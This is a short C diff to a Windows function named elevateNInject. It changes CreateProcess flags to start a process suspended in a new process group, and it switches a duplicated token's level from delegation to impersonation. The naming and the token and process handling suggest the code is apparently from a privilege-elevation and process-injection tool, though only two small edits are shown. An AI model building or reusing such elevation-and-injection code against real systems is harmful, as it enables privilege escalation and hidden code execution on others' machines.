@@ -293,7 +293,7 @@ BOOL elevateNInject(_In_ HANDLE parentProc) {
 		NULL,
 		NULL,
 		TRUE,
-		EXTENDED_STARTUPINFO_PRESENT,
+		EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_PROCESS_GROUP | CREATE_SUSPENDED,
 		NULL,
 		NULL,
 		(LPSTARTUPINFO)&si,
@@ -364,7 +364,7 @@ BOOL elevateNInject(_In_ HANDLE parentProc) {
 	}
 
 	HANDLE dupToken = NULL;
-	if (!DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityDelegation, TokenImpersonation, &dupToken))
+	if (!DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &dupToken))
 	{
 		return FALSE;
 	}
